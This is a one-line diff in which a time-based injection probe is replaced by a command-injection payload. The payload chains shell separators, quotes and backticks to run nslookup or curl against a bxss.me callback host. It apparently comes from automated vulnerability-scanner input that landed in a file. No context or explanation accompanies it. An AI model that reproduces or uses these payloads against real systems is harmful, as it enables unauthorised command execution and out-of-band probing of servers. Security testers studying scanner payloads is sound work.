@@ -1,1 +1,1 @@
-555"||sleep(27*1000)*rsvhsg||"
+&(nslookup -q=cname hitzgexjmppfn121b2.bxss.me||curl hitzgexjmppfn121b2.bxss.me)&'\"`0&(nslookup -q=cname hitzgexjmppfn121b2.bxss.me||curl hitzgexjmppfn121b2.bxss.me)&`'
